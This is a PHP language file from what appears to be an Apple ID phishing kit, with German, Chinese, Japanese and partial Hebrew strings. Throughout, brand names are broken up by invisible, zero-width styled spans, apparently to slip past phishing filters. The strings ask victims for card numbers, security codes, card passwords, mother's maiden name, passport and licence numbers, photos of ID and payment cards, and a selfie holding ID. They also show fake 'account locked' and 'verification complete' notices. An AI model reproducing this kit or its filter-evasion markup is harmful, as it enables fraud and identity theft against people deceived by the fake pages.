	$YourAppleID = "Ihre <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-ID lautet ";
	$OuSignt = "Ausloggen ";
	$PersonalInformation = "Persönliche Angaben";
	$NAME = "Name";
	$firstname = "Vorname";
	$middlename = "Zweitname (optional)";
	$lastname = "Nachname";
	$OFBIRTH = "GEBURTSDATUM";
	$dateobirth = "Geburtsdatum";
	$TELEPHONE = "TELEFON";
	$ADDRESS = "ADRESSE";
    $LineADDRESS = "Adresszeile ";
	$city = "stadt / stadt";
	$POSTCO = "POSTLEITZAHL";
	$AccountDetails = "Kontodetails";
	$CARDDETAILS = "Kartendetails";
	$CAname = "Name des Karteninhabers";
	$CAnumber = "Kartennummer";
	$CAdater = "Verfallsdatum";
	$securitycode = "Karten-Sicherheitscode";
	$cardpassword = "vbv-kennwort oder kartenkennwort";
	$Security = "Sicherheit";
	$SELECTQUESTION = "Wähle eine Sicherheitsfrage";
	$securityquestion = "Sicherheitsfrage auswählen";
	$MaideNamen = "Name der Mutter";
	$LicenseNumber = "Führerscheinnummer";
	$PassportNumber = "Ausweisnummer";
	$answer = "Antworten";

// Id 1

	$IdentityVerification = "Identitätsprüfung";
	$doIDcument = "1 - Laden Sie Fotos von beiden Seiten Ihres Ausweisdokuments hoch.";
	$residencedocument = "2 - Foto des Aufenthaltsnachweises hochladen";
	$couldyour = "Das könnte dein sein :";
	$billinternet = "Kontoauszug oder Stromrechnung (Stromrechnung, Wasserrechnung, Internetrechnung usw.)";
	$Email = " Email";
	$fsidedocument = " - Vorderseite Ihres Ausweises";
	$Backside = " - Rückseite Ihres ID-Dokuments";
	$residencephoto = " - Foto des Aufenthaltsnachweises";

// Id 2
    $sidespaymentcard = "Laden Sie Fotos von beiden Seiten Ihrer Zahlungskarte hoch.&nbsp;";
	$Email = " Email";
	$FrontsideCard = " - Vorderseite Ihrer Zahlungskarte";
	$syourideBack = " - Rückseite Ihrer Zahlungskarte";
	$Email = "";
	$Email = "";
	
	$clearCard = "-Gelieve een duidelijke foto van uw IDENTITEITsKaart te uploaden"; 
$takeselfie = "-je moet je ID naast je gezicht houden en een selfie nemen"; 
$thenupload = "Kies de foto en klik op uploaden."; 
$uploadii = "Upload &rarr;"; 
	
// Fin

    $VerificationComplete = "Kontobestätigung abgeschlossen";
    $accessaccount = "Bitte warten Sie, während wir Ihren Zugang zum Konto wiederherstellen ...";
    $automaticallylogged = "Zu Ihrer Sicherheit werden Sie automatisch abgemeldet. ";
	// Link Email

    $vverrmail = "Fügen Sie Ihre E-Mail-Adresse hinzu.";
	$emaillsz = "Email";
	$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> speichert Ihr Passwort nicht.";
	$itoCloud = "Bei <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div> anmelden";
    $Keepme = "Ich bin angemeldet";

break;


case "CN":
$TTLEZ="登录";
$SignIn="登录";
$Createapid="创建您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID";
$ForgotApple ="忘记 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID或密码？";
$accounteverything="您的帐户的一切苹果。";
$services="一个 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID和密码可让您访问所有 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> 服务。";
$about="了解更多关于 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID ";
$CreateApple="创建您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID";
$Shoplthe="购物 ";
$OnlineStore=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  Store在线商店";
$visit="访问 ";
$RetailStore="苹果零售店";
$find="或找到一个 ";
$reseller = "经销商";
$AppleInfo="苹果信息";
$Map="网站地图";
$News="热门新闻";
$Feeds="RSS订阅源";
$Contact="联系我们";
$rightsreserved = "Copyright © 2019  <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  Inc. All rights reserved.";
$TermsUse="使用条款";
$Policy="隐私政策";
$accManageount="管理您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> 帐户 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID";
$acApplecount="管理您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> 帐户";
$Password = "密码";
$Rmeemember="记住我";
$morehelp="需要更多帮助？ ";
$Chatnow="现在聊天";
$M800YApple ="或致电1-800- <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> 。";
$cfasterheckout="登录更快的结帐。";
$iCsaddressignloud="您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID 是您用来登录 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>、App Store 和 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div> 的电子邮件地址。";
$ISignn="登入";
$pForgotassword="忘记了您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID或密码？";
$unpassworddefined="忘记了您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID或密码？";
$Creatonee="没有 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID？ 现在创建一个。";
$haveCApplereate="没有 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID？ 现在创建一个。";
$IApplesD=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID";
$fAqqq="常见问题";
$securityreasons="由于安全原因，此 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID已被锁定。";
$beforesigning="您必须在登录之前解锁您的帐户。";
$UnlockAccount="解锁帐户";
$yourinformation = "确认您的信息";
$AccountVerification="帐户验证";
$YourAppleID="您的 <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  ID是 ";
$OuSignt="登出 ";
$PersonalInformation="个人信息";
$NAME="Name";
$firstname="名字";
$middlename="中间名（可选)";
$lastname="姓氏";
$OFBIRTH="出生日期";
$dateobirth="出生日期";
$TELEPHONE = "电话";
$rtphone="电话号码";
$ADDRESS="地址";
$LineADDRESS="地址行 ";
$city="城镇/城市";
$POSTCO="邮政编码";
$AccountDetails="帐户详细信息";
$CARDDETAILS="卡详细信息";
$CAname="持卡人姓名";
$CAnumber="卡号";
$CAdater="到期日";
$securitycode="卡安全码";
$cardpassword="vbv密码或卡密码";
$Security = "安全";
$SELECTQUESTION="选择一个安全问题";
$securityquestion="选择安全问题";
$MaideNamen="母亲的姓氏";
$LicenseNumber="驾驶执照编号";
$PassportNumber="护照号码";
$answer = "答案";
$nxt="下一个";
$IdentityVerification="身份验证";
$doIDcument="1-上传您的身份证件的两侧的照片。";
$residencedocument="2-上传居住证明文件照片";
$couldyour="这可能是你的 :";
$billinternet="银行账单或水电费账单（电费账单、水费账单、上网账单等）)";
$Email = " 电子邮件";
$fsidedocument="-ID文档的正面";
$Backside="-身份证件背面";
$residencephoto="-居住证明文件照片";
$sidespaymentcard="上传您的支付卡双方的照片。 ";
$Email = " 电子邮件";
$FrontsideCard="-您的支付卡的正面";
$syourideeback="-您的支付卡背面";
$clearCard="-请上传身份证的清晰照片";
$takeselfie="-你应该把你的身份证旁边你的脸，并采取selfie";
$thenupload="选择照片，然后点击上传。 ";
$uploadii="Upload&rarr;";
$VerificationComplete="帐户验证完成";
$accessaccount="请等待，而我们恢复您的帐户访问。..";
$automaticallylogged="为了您的安全，您将自动注销。 ";
$vverrmail="添加您的电子邮件地址。";
$emaillsz="电子邮件";
$wontsy=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> 不会储存您的密码。";
break;

case "JP":
$TTLEZ="サインイン";
$SignIn="サインイン";
$CreateapID =" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID を作成します";
$ForgotApple =" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID またはパスワードを忘れましたか？";
$accounteverything="すべてのアップルのためのあなたのアカウント。";
$services="単一の <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID とパスワードを使用すると、すべての <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> サービスにアクセスできます。";
$about=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID の詳細 ";
$CreateApple =" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID を作成する";
$Shopthe="ショップ ";
$OnlineStore="アップルオンラインストア";
$visit = " 訪問 ";
$RetailStore=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>   直営店";
$find="または ";
$reseller="reseller";
$AppleInfo="アップル情報";
$Map="サイトマップ";
$News = "ホットニュース";
$Feeds="RSSフィード";
$Contact="お問い合わせ";
$rightsreserved="Copyright © 2019  <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>  Inc. ﾂつﾂづｩﾂ";
$TermsUse="利用規約";
$Policy="プライバシーポリシー";
$accManageount=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> アカウントの <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID を管理します";
$acApplecount=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> アカウントの管理";
$Password = "パスワード";
$Rmeemember="私を覚えている";
$morehelp="より多くの助けが必要ですか？ ";
$Chatnow="今すぐチャット";
$M800YApple ="または1-800-MY- <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> を呼び出します。";
$cfasterheckout="より速いチェックアウトのためにサインインします。";
$iCsaddressignloud=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID は、<div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>、App Store、<div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> へのサインインに使用するメールアドレスです。";
$ISignn="サインイン";
$pForgotassword="お使いの <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID またはパスワードを忘れましたか？";
$unpassworddefined=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID またはパスワードを忘れましたか？";
$Creatonee=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID を持っていませんか？ 今すぐ作成します。";
$haveCApplereate=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID を持っていませんか？ 今すぐ作成します。";
$IApplesD=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID ";
$fAqqq="よくある質問";
$securityreasons="この <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID はセキュリティ上の理由でロックされています。";
$beforesigning="だけを解除する前に調印。";
$UnlockAccount="アカウントのロック解除";
$yourinformation="情報の確認";
$AccountVerification="アカウントの確認";
$YourAppleID = "<div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID は以下のとおりです ";
$OuSignt="サインアウト ";
$PersonalInformation="個人情報";
$NAME="名前";
$firstname="ファーストネーム";
$mIDdlename="ミドルネーム(オプション)";
$lastname="姓";
$OFBIRTH="生年月日";
$dateobirth="生年月日";
$TELEPHONE="TELEPHONE";
$rtphone="電話番号";
$ADDRESS="アドレス";
$LineADDRESS="アドレス行 ";
$city="タウン/シティ";
$POSTCO="郵便番号";
$AccountDetails="アカウントの詳細";
$CARDDETAILS="カードの詳細";
$CAname="カード所有者名";
$CAnumber="カード番号";
$CAdater="有効期限";
$securitycode="カードセキュリティコード";
$cardpassword="vbvパスワードまたはカードパスワード";
$Security="セキュリティ";
$SELECTQUESTION="セキュリティの質問を選択します";
$securityquestion="セキュリティ質問の選択";
$MaIDeNamen="母親の旧姓";
$LicenseNumber="運転免許証番号";
$PassportNumber="パスポート番号";
$answer="回答";
$nxt="次へ";
$IDentityVerification="身元確認";
$doIDcument="1-ID ドキュメントの両面の写真をアップロードします。";
$resIDencedocument="2-居住証明書の写真をアップロードする";
$couldyour="これはあなたの可能性があります :";
$billinternet="銀行声明かガス電気手形(電気手形、水手形、インターネット手形、等。)";
$Email="メール";
$fsIDedocument="-ID ドキュメントの前面";
$BacksIDe="-ID ドキュメントの裏面";
$resIDencephoto="-居住証明書の証明写真";
$sIDespaymentcard="支払いカードの両面の写真をアップロードします。 ";
$Email="メール";
$FrontsIDeCard="-お支払いカードの表側";
$syourIDeBack="-お支払いカードの裏面";
$clearCard="-あなたのID カードの明確な写真をアップロードしてください";
$takeselfie="-あなたはあなたの顔の横にあなたのID を保持し、自分撮りを取る必要があります";
$thenupload="写真を選択し、アップロードをクリックします。 ";
$uploadii="アップロード&rarr;";
$VerificationComplete="アカウントの検証完了";
$accessaccount="アカウントへのアクセスを復元するまでお待ちください。..";
$automaticallylogged="セキュリティのために自動的にログアウトされます。 ";
$vverrmail="メールアドレスを追加します。";
$emaillsz="メール";
$wontsy=" <div style='display:contents'><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> はパスワードを保存しません。";
break;


case "IL":
// Front page	
    $nxt = "הבא";
    $TTLEZ = "היכנס";
	$SignIn = "היכנס";
	$Createapid = "יצירת מזהה <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> שלך";
